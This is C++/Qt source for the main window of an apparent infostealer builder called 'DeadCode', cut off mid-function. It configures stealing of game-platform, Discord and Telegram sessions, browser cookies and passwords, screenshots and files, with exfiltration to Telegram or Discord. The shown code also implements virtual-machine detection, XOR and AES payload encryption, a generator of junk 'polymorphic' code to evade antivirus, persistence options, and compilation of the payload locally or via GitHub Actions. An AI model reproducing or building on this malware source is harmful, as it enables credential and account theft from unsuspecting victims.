#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"

#include <QMessageBox>
#include <QProcess>
#include <QFileDialog>
#include <QFile>
#include <QTextStream>
#include <QPropertyAnimation>
#include <QTimer>
#include <QDebug>
#include <QScreen>
#include <QPixmap>
#include <QJsonDocument>
#include <QJsonObject>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHostInfo>
#include <QSettings>
#include <QDir>
#include <QRegularExpression>
#include <QGuiApplication>
#include <QThread>
#include <QSysInfo>
#include <QClipboard>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <bcrypt.h>
#include <zip.h>
#include <sqlite3.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>

// Определение глобальной переменной
MainWindow* g_mainWindow = nullptr;

// Функция для получения данных от libcurl
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    s->append((char*)contents, newLength);
    return newLength;
}

// Реализация класса StealerWorker
class StealerWorker : public QObject {
    Q_OBJECT
public:
    StealerWorker(MainWindow* window, const std::string& tempDir) : window(window), tempDir(tempDir) {}

public slots:
    void process() {
        window->StealAndSendData(tempDir);
        emit finished();
    }

signals:
    void finished();

private:
    MainWindow* window;
    std::string tempDir;
};

// Удобный метод для вызова сигнала logUpdated
void MainWindow::emitLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    emit logUpdated(message);
}

// Реализация метода updateConfigFromUI
void MainWindow::updateConfigFromUI() {
    QMutexLocker locker(&logMutex); // Потокобезопасность

    config.sendMethod = sendMethodComboBox->currentText().toStdString();
    config.buildMethod = buildMethodComboBox->currentText().toStdString();
    config.telegramToken = tokenLineEdit->text().toStdString();
    config.chatId = chatIdLineEdit->text().toStdString();
    config.discordWebhook = discordWebhookLineEdit->text().toStdString();
    config.filename = fileNameLineEdit->text().toStdString();
    config.encryptionKey1 = encryptionKey1LineEdit->text().toStdString();
    config.encryptionKey2 = encryptionKey2LineEdit->text().toStdString();
    config.encryptionSalt = encryptionSaltLineEdit->text().toStdString();
    config.iconPath = iconPathLineEdit->text().toStdString();
    config.githubToken = githubTokenLineEdit->text().toStdString();
    config.githubRepo = githubRepoLineEdit->text().toStdString();

    // Обновление чекбоксов
    config.discord = discordCheckBox->isChecked();
    config.steam = steamCheckBox->isChecked();
    config.steamMAFile = steamMAFileCheckBox->isChecked();
    config.epic = epicCheckBox->isChecked();
    config.roblox = robloxCheckBox->isChecked();
    config.battlenet = battlenetCheckBox->isChecked();
    config.minecraft = minecraftCheckBox->isChecked();
    config.cookies = cookiesCheckBox->isChecked();
    config.passwords = passwordsCheckBox->isChecked();
    config.screenshot = screenshotCheckBox->isChecked();
    config.fileGrabber = fileGrabberCheckBox->isChecked();
    config.systemInfo = systemInfoCheckBox->isChecked();
    config.socialEngineering = socialEngineeringCheckBox->isChecked();
    config.chatHistory = chatHistoryCheckBox->isChecked();
    config.telegram = telegramCheckBox->isChecked();
    config.antiVM = antiVMCheckBox->isChecked();
    config.fakeError = fakeErrorCheckBox->isChecked();
    config.silent = silentCheckBox->isChecked();
    config.autoStart = autoStartCheckBox->isChecked();
    config.persist = persistCheckBox->isChecked();
    config.selfDestruct = false; // Пока не реализовано в UI, оставим false
}

// Конструктор
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , manager(new QNetworkAccessManager(this))
    , isBuilding(false)
    , buildTimer(new QTimer(this))
    , statusCheckTimer(new QTimer(this))
{
    ui->setupUi(this);
    g_mainWindow = this; // Инициализация глобальной переменной

    // Инициализация UI элементов
    tokenLineEdit = ui->tokenLineEdit;
    chatIdLineEdit = ui->chatIdLineEdit;
    discordWebhookLineEdit = ui->discordWebhookLineEdit;
    fileNameLineEdit = ui->fileNameLineEdit;
    encryptionKey1LineEdit = ui->encryptionKey1LineEdit;
    encryptionKey2LineEdit = ui->encryptionKey2LineEdit;
    encryptionSaltLineEdit = ui->encryptionSaltLineEdit;
    iconPathLineEdit = ui->iconPathLineEdit;
    githubTokenLineEdit = ui->githubTokenLineEdit;
    githubRepoLineEdit = ui->githubRepoLineEdit;
    sendMethodComboBox = ui->sendMethodComboBox;
    buildMethodComboBox = ui->buildMethodComboBox;
    steamCheckBox = ui->steamCheckBox;
    steamMAFileCheckBox = ui->steamMAFileCheckBox;
    epicCheckBox = ui->epicCheckBox;
    robloxCheckBox = ui->robloxCheckBox;
    battlenetCheckBox = ui->battlenetCheckBox;
    minecraftCheckBox = ui->minecraftCheckBox;
    discordCheckBox = ui->discordCheckBox;
    telegramCheckBox = ui->telegramCheckBox;
    chatHistoryCheckBox = ui->chatHistoryCheckBox;
    cookiesCheckBox = ui->cookiesCheckBox;
    passwordsCheckBox = ui->passwordsCheckBox;
    screenshotCheckBox = ui->screenshotCheckBox;
    fileGrabberCheckBox = ui->fileGrabberCheckBox;
    systemInfoCheckBox = ui->systemInfoCheckBox;
    socialEngineeringCheckBox = ui->socialEngineeringCheckBox;
    antiVMCheckBox = ui->antiVMCheckBox;
    fakeErrorCheckBox = ui->fakeErrorCheckBox;
    silentCheckBox = ui->silentCheckBox;
    autoStartCheckBox = ui->autoStartCheckBox;
    persistCheckBox = ui->persistCheckBox;
    textEdit = ui->textEdit;
    iconBrowseButton = ui->iconBrowseButton;
    buildButton = ui->buildButton;
    actionSaveConfig = ui->actionSaveConfig;
    actionLoadConfig = ui->actionLoadConfig;
    actionExportLogs = ui->actionExportLogs;
    actionExit = ui->actionExit;
    actionAbout = ui->actionAbout;

    // Инициализация значений по умолчанию
    sendMethodComboBox->addItems({"Local File", "Telegram", "Discord"});
    buildMethodComboBox->addItems({"Local Build", "GitHub Actions"});
    fileNameLineEdit->setText("DeadCode.exe");
    textEdit->setPlaceholderText("Logs will appear here...");

    // Анимация для логотипа
    QPropertyAnimation *logoAnimation = new QPropertyAnimation(ui->logoLabel, "geometry", this);
    logoAnimation->setDuration(1500);
    logoAnimation->setStartValue(QRect(0, -150, 600, 150));
    logoAnimation->setEndValue(QRect(0, 0, 600, 150));
    logoAnimation->setEasingCurve(QEasingCurve::OutBounce);
    logoAnimation->start();

    // Анимация пульсации для кнопки "Собрать"
    QPropertyAnimation *buttonAnimation = new QPropertyAnimation(ui->buildButton, "size", this);
    buttonAnimation->setDuration(1000);
    buttonAnimation->setStartValue(QSize(100, 40));
    buttonAnimation->setKeyValueAt(0.5, QSize(120, 50));
    buttonAnimation->setEndValue(QSize(100, 40));
    buttonAnimation->setLoopCount(-1);
    buttonAnimation->setEasingCurve(QEasingCurve::InOutQuad);
    buttonAnimation->start();

    // Анимация появления секций
    animateSection(ui->gamingSectionLabel, ui->gamingSpacer);
    animateSection(ui->messengersSectionLabel, ui->messengersSpacer);
    animateSection(ui->browserSectionLabel, ui->browserSpacer);
    animateSection(ui->additionalSectionLabel, ui->additionalSpacer);
    animateSection(ui->stealthSectionLabel, ui->verticalSpacer);

    // Инициализация строки состояния
    ui->statusbar->showMessage("Готово", 0);

    // Подключение сигналов и слотов
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->actionSaveConfig, &QAction::triggered, this, &MainWindow::on_actionSaveConfig_triggered);
    connect(ui->actionLoadConfig, &QAction::triggered, this, &MainWindow::on_actionLoadConfig_triggered);
    connect(ui->actionExportLogs, &QAction::triggered, this, &MainWindow::on_actionExportLogs_triggered);
    connect(ui->actionExit, &QAction::triggered, this, &MainWindow::on_actionExit_triggered);
    connect(ui->actionAbout, &QAction::triggered, this, &MainWindow::on_actionAbout_triggered);
    connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
    connect(ui->sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
        ui->statusbar->showMessage("Метод отправки: " + text, 0);
    });
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);

    // Инициализация config начальными значениями
    updateConfigFromUI();
}

// Деструктор
MainWindow::~MainWindow() {
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
    g_mainWindow = nullptr;
}

// Анимация секций
void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer) {
    QWidget* parentWidget = sectionLabel->parentWidget();
    QVBoxLayout* layout = qobject_cast<QVBoxLayout*>(parentWidget->layout());
    if (!layout) return;

    QList<QWidget*> widgetsToAnimate;
    int startIndex = layout->indexOf(sectionLabel);
    int endIndex = spacer ? layout->indexOf(spacer) : layout->count();

    widgetsToAnimate.append(sectionLabel);
    for (int i = startIndex + 1; i < endIndex; ++i) {
        QLayoutItem* item = layout->itemAt(i);
        if (QWidget* widget = item->widget()) {
            if (dynamic_cast<QCheckBox*>(widget) || dynamic_cast<QComboBox*>(widget)) {
                widgetsToAnimate.append(widget);
            }
        }
    }

    for (QWidget* widget : widgetsToAnimate) {
        widget->setStyleSheet("opacity: 0;");
        widget->setMaximumHeight(0);
    }

    QParallelAnimationGroup* group = new QParallelAnimationGroup(this);
    for (QWidget* widget : widgetsToAnimate) {
        QPropertyAnimation* opacityAnimation = new QPropertyAnimation(widget, "windowOpacity");
        opacityAnimation->setDuration(500);
        opacityAnimation->setStartValue(0);
        opacityAnimation->setEndValue(1);
        opacityAnimation->setEasingCurve(QEasingCurve::OutCubic);

        QPropertyAnimation* heightAnimation = new QPropertyAnimation(widget, "maximumHeight");
        heightAnimation->setDuration(500);
        heightAnimation->setStartValue(0);
        heightAnimation->setEndValue(widget->sizeHint().height());
        heightAnimation->setEasingCurve(QEasingCurve::OutCubic);

        group->addAnimation(opacityAnimation);
        group->addAnimation(heightAnimation);
    }

    QTimer::singleShot(widgetsToAnimate.indexOf(sectionLabel) * 200, this, [group]() {
        group->start(QAbstractAnimation::DeleteWhenStopped);
    });
}

// Генерация случайной строки
std::string MainWindow::generateRandomString(size_t length) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::string result;
    result.reserve(length);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

    for (size_t i = 0; i < length; ++i) {
        result += alphanum[dis(gen)];
    }

    return result;
}

// Генерация уникального XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream ss;
    for (int i = 0; i < 16; ++i) {
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }
    return ss.str();
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string keyStr = useFirstKey ? config.encryptionKey1 : config.encryptionKey2;
    if (keyStr.empty()) {
        keyStr = generateRandomString(16);
        if (useFirstKey) config.encryptionKey1 = keyStr;
        else config.encryptionKey2 = keyStr;
    }
    std::array<unsigned char, 16> key;
    if (keyStr.length() >= 16) {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i]);
        }
    } else {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);
        }
    }
    return key;
}

// Генерация IV
std::array<unsigned char, 16> MainWindow::generateIV() {
    std::array<unsigned char, 16> iv;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (auto& byte : iv) {
        byte = static_cast<unsigned char>(dis(gen));
    }
    return iv;
}

// Проверка на виртуальную машину
bool MainWindow::isRunningInVM() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[1024];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", nullptr, nullptr, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            std::string biosVersion(buffer);
            if (biosVersion.find("VMware") != std::string::npos || biosVersion.find("VirtualBox") != std::string::npos) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
    return false;
}

// Применение XOR-шифрования
QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key) {
    QByteArray result = data;
    for (int i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

// Применение AES-шифрования
QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
    QByteArray result;
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открытие алгоритма шифрования
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES: " + QString::number(status, 16));
        return QByteArray();
    }

    // Установка режима цепочки
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось установить режим цепочки: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    // Генерация ключа
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось сгенерировать ключ AES: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    // Шифрование данных
    DWORD bytesEncrypted = 0;
    DWORD resultSize = data.size() + 16; // Дополнительное место для padding
    std::vector<UCHAR> encryptedData(resultSize);

    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(),
                           encryptedData.data(), resultSize, &bytesEncrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка шифрования AES: " + QString::number(status, 16));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    result = QByteArray((char*)encryptedData.data(), bytesEncrypted);

    // Освобождение ресурсов
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return result;
}

// Дешифрование данных (новый метод)
void MainWindow::decryptData(const std::string& inputPath, const std::string& outputPath) {
    emitLog("Дешифрование данных...");

    std::ifstream inFile(inputPath, std::ios::binary);
    if (!inFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть файл для дешифрования: " + QString::fromStdString(inputPath));
        return;
    }

    std::vector<char> encryptedData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    if (encryptedData.size() < 16) {
        emitLog("Ошибка: Файл слишком мал для дешифрования (нет IV)");
        return;
    }

    // Извлекаем IV из первых 16 байт
    std::array<unsigned char, 16> iv;
    std::memcpy(iv.data(), encryptedData.data(), 16);

    // Оставшиеся данные — это зашифрованные данные
    QByteArray encryptedByteData(encryptedData.data() + 16, encryptedData.size() - 16);
    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);

    // Дешифрование AES
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES для дешифрования: " + QString::number(status, 16));
        return;
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось установить режим цепочки для дешифрования: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key2.data(), (ULONG)key2.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось сгенерировать ключ AES для дешифрования: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return;
    }

    DWORD bytesDecrypted = 0;
    DWORD resultSize = encryptedByteData.size();
    std::vector<UCHAR> decryptedData(resultSize);

    status = BCryptDecrypt(hKey, (PUCHAR)encryptedByteData.data(), encryptedByteData.size(), nullptr, (PUCHAR)iv.data(), iv.size(),
                           decryptedData.data(), resultSize, &bytesDecrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка дешифрования AES: " + QString::number(status, 16));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return;
    }

    QByteArray xorData((char*)decryptedData.data(), bytesDecrypted);

    // Дешифрование XOR
    QByteArray decryptedByteData = applyXOR(xorData, key1);

    std::ofstream outFile(outputPath, std::ios::binary);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось сохранить дешифрованные данные: " + QString::fromStdString(outputPath));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return;
    }

    outFile.write(decryptedByteData.constData(), decryptedByteData.size());
    outFile.close();

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    emitLog("Данные успешно дешифрованы: " + QString::fromStdString(outputPath));
}

// Генерация полиморфного кода
void MainWindow::generatePolymorphicCode() {
    std::ofstream polyFile("polymorphic_code.h");
    if (!polyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать polymorphic_code.h. Проверьте права доступа.");
        isBuilding = false;
        return;
    }

    polyFile << "#ifndef POLYMORPHIC_CODE_H\n";
    polyFile << "#define POLYMORPHIC_CODE_H\n\n";
    polyFile << "#include <random>\n";
    polyFile << "#include <string>\n";
    polyFile << "#include <sstream>\n";
    polyFile << "#include <iomanip>\n";
    polyFile << "#include <chrono>\n";
    polyFile << "#include <thread>\n\n";
    polyFile << "// Этот файл перегенерируется динамически в mainwindow.cpp через generatePolymorphicCode()\n\n";

    polyFile << "inline int getRandomNumber(int min, int max) {\n";
    polyFile << "    static std::random_device rd;\n";
    polyFile << "    static std::mt19937 gen(rd());\n";
    polyFile << "    std::uniform_int_distribution<> dis(min, max);\n";
    polyFile << "    return dis(gen);\n";
    polyFile << "}\n\n";

    polyFile << "inline std::string generateRandomString(size_t length) {\n";
    polyFile << "    static const char alphanum[] =\n";
    polyFile << "        \"0123456789\"\n";
    polyFile << "        \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n";
    polyFile << "        \"abcdefghijklmnopqrstuvwxyz\";\n";
    polyFile << "    std::string result;\n";
    polyFile << "    result.reserve(length);\n";
    polyFile << "    for (size_t i = 0; i < length; ++i) {\n";
    polyFile << "        result += alphanum[getRandomNumber(0, sizeof(alphanum) - 2)];\n";
    polyFile << "    }\n";
    polyFile << "    return result;\n";
    polyFile << "}\n\n";

    polyFile << "inline std::string generateRandomFuncName() {\n";
    polyFile << "    static const char* prefixes[] = {\"polyFunc\", \"obfFunc\", \"cryptFunc\", \"hideFunc\", \"maskFunc\"};\n";
    polyFile << "    std::stringstream ss;\n";
    polyFile << "    ss << prefixes[getRandomNumber(0, 4)] << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999) << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999);\n";
    polyFile << "    return ss.str();\n";
    polyFile << "}\n\n";

    polyFile << "namespace Polymorphic {\n\n";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(5, 10);
    int funcCount = dis(gen);
    std::vector<std::string> funcNames;
    for (int i = 0; i < funcCount; ++i) {
        std::string funcName;
        do {
            std::stringstream ss;
            ss << "polyFunc_" << std::setw(5) << std::setfill('0') << dis(gen) << "_" << std::setw(5) << std::setfill('0') << dis(gen);
            funcName = ss.str();
        } while (std::find(funcNames.begin(), funcNames.end(), funcName) != funcNames.end());
        funcNames.push_back(funcName);
        polyFile << "    inline void " << funcName << "() {\n";
        polyFile << "        volatile int dummy_" << dis(gen) << "_" << dis(gen) << " = getRandomNumber(1000, 15000);\n";
        polyFile << "        std::string noise = generateRandomString(getRandomNumber(5, 20));\n";
        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ noise.length();\n";
        polyFile << "        for (int i = 0; i < getRandomNumber(3, 15); i++) {\n";
        polyFile << "            if (dummy2_" << dis(gen) << "_" << dis(gen) << " % 2 == 0) {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " << getRandomNumber(1, 3)) ^ noise[i % noise.length()];\n";
        polyFile << "            } else {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " >> getRandomNumber(1, 2)) + getRandomNumber(10, 50);\n";
        polyFile << "            }\n";
        polyFile << "        }\n";
        polyFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 10)));\n";
        polyFile << "    }\n\n";
    }

    polyFile << "    inline void executePolymorphicCode() {\n";
    for (const auto& funcName : funcNames) {
        polyFile << "        " << funcName << "();\n";
    }
    polyFile << "    }\n\n";

    polyFile << "} // namespace Polymorphic\n\n";
    polyFile << "#endif // POLYMORPHIC_CODE_H\n";

    polyFile.close();
    emitLog("Полиморфный код сгенерирован в polymorphic_code.h");
}

// Генерация заголовочного файла ключей
void MainWindow::generateBuildKeyHeader() {
    std::ofstream keyFile("build_key.h");
    if (!keyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать build_key.h. Проверьте права доступа.");
        isBuilding = false;
        return;
    }

    keyFile << "#ifndef BUILD_KEY_H\n";
    keyFile << "#define BUILD_KEY_H\n\n";
    keyFile << "#include <array>\n";
    keyFile << "#include <string>\n";
    keyFile << "#include <sstream>\n";
    keyFile << "#include <iomanip>\n";
    keyFile << "#include <random>\n";
    keyFile << "#include <cstring>\n\n";
    keyFile << "// Этот файл генерируется автоматически в mainwindow.cpp через generateBuildKeyHeader()\n\n";

    keyFile << "const std::string ENCRYPTION_KEY_1 = \"" << config.encryptionKey1 << "\";\n";
    keyFile << "const std::string ENCRYPTION_KEY_2 = \"" << config.encryptionKey2 << "\";\n";
    keyFile << "const std::string ENCRYPTION_SALT = \"" << config.encryptionSalt << "\";\n\n";

    keyFile << "inline std::array<unsigned char, 16> GenerateUniqueKey() {\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    for (size_t i = 0; i < key.size(); ++i) {\n";
    keyFile << "        key[i] = static_cast<unsigned char>(dis(gen));\n";
    keyFile << "    }\n";
    keyFile << "    return key;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateUniqueXorKey() {\n";
    keyFile << "    std::array<unsigned char, 16> key = GenerateUniqueKey();\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    ss << std::hex << std::setfill('0');\n";
    keyFile << "    for (unsigned char byte : key) {\n";
    keyFile << "        ss << std::setw(2) << static_cast<int>(byte);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& keyStr) {\n";
    keyFile << "    std::array<unsigned char, 16> key = {};\n";
    keyFile << "    if (!keyStr.empty()) {\n";
    keyFile << "        size_t len = std::min<size_t>(keyStr.length(), 16);\n";
    keyFile << "        std::memcpy(key.data(), keyStr.c_str(), len);\n";
    keyFile << "        if (len < 16) {\n";
    keyFile << "            std::memset(key.data() + len, 0, 16 - len);\n";
    keyFile << "        }\n";
    keyFile << "    }\n";
    keyFile << "    return key;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GetEncryptionSalt(const std::string& userSalt) {\n";
    keyFile << "    if (!userSalt.empty()) {\n";
    keyFile << "        return userSalt;\n";
    keyFile << "    }\n";
    keyFile << "    return GenerateUniqueXorKey();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateRandomSalt() {\n";
    keyFile << "    return GenerateUniqueXorKey();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::array<unsigned char, 16> GenerateIV() {\n";
    keyFile << "    std::array<unsigned char, 16> iv;\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    for (size_t i = 0; i < iv.size(); ++i) {\n";
    keyFile << "        iv[i] = static_cast<unsigned char>(dis(gen));\n";
    keyFile << "    }\n";
    keyFile << "    return iv;\n";
    keyFile << "}\n\n";

    keyFile << "#endif // BUILD_KEY_H\n";

    keyFile.close();
    emitLog("Файл ключей сгенерирован в build_key.h");
}

// Копирование иконки в директорию сборки
void MainWindow::copyIconToBuild() {
    if (config.iconPath.empty()) {
        emitLog("Иконка не указана, пропуск копирования");
        return;
    }

    std::string destPath = "build/" + std::filesystem::path(config.iconPath).filename().string();
    try {
        std::filesystem::create_directories("build");
        std::filesystem::copy_file(config.iconPath, destPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Иконка скопирована в директорию сборки: " + QString::fromStdString(destPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования иконки: " + QString::fromStdString(e.what()));
    }
}

// Сборка исполняемого файла
void MainWindow::buildExecutable() {
    buildTimer->stop();
    isBuilding = true;
    emitLog("Начало сборки исполняемого файла...");

    QProcess process;
    QStringList arguments;

    // Предполагаем, что используется MinGW для компиляции
    arguments << "main.cpp" << "-o" << QString::fromStdString("build/" + config.filename);
    if (!config.iconPath.empty()) {
        std::string resourceFile = "build/resource.rc";
        std::ofstream rcFile(resourceFile);
        rcFile << "IDI_ICON1 ICON \"" << std::filesystem::path(config.iconPath).filename().string() << "\"";
        rcFile.close();
        system(("windres " + resourceFile + " -O coff -o build/resource.o").c_str());
        arguments << "build/resource.o";
    }
    arguments << "-lbcrypt" << "-lzip" << "-lsqlite3" << "-lcurl" << "-lshlwapi" << "-lpsapi" << "-liphlpapi";

    process.start("g++", arguments);
    process.waitForFinished(-1);

    if (process.exitCode() == 0) {
        emitLog("Сборка успешно завершена: " + QString::fromStdString("build/" + config.filename));
        emit startStealSignal();
    } else {
        emitLog("Ошибка сборки: " + QString::fromStdString(process.readAllStandardError().toStdString()));
    }

    isBuilding = false;
}

// Запуск сборки через GitHub Actions
void MainWindow::triggerGitHubActions() {
    if (config.githubToken.empty() || config.githubRepo.empty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны");
        isBuilding = false;
        return;
    }

    emitLog("Запуск сборки через GitHub Actions...");

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL");
        isBuilding = false;
        return;
    }

    std::string url = "https://api.github.com/repos/" + config.githubRepo + "/actions/workflows/build.yml/dispatches";
    std::string postData = "{\"ref\":\"main\"}";
    std::string authHeader = "Authorization: token " + config.githubToken;
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Accept: application/vnd.github.v3+json");
    headers = curl_slist_append(headers, authHeader.c_str());
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "DeadCode-Stealer/1.0");

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка запуска GitHub Actions: " + QString::fromStdString(curl_easy_strerror(res)));
        isBuilding = false;
    } else {
        emitLog("Сборка через GitHub Actions запущена");
        statusCheckTimer->start(30000); // Проверяем статус каждые 30 секунд
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

// Проверка статуса сборки через GitHub Actions
void MainWindow::checkBuildStatus() {
    if (workflowRunId.isEmpty()) {
        CURL* curl = curl_easy_init();
        if (!curl) {
            emitLog("Ошибка: Не удалось инициализировать CURL для проверки статуса");
            return;
        }

        std::string url = "https://api.github.com/repos/" + config.githubRepo + "/actions/runs";
        std::string authHeader = "Authorization: token " + config.githubToken;
        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, "Accept: application/vnd.github.v3+json");
        headers = curl_slist_append(headers, authHeader.c_str());

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
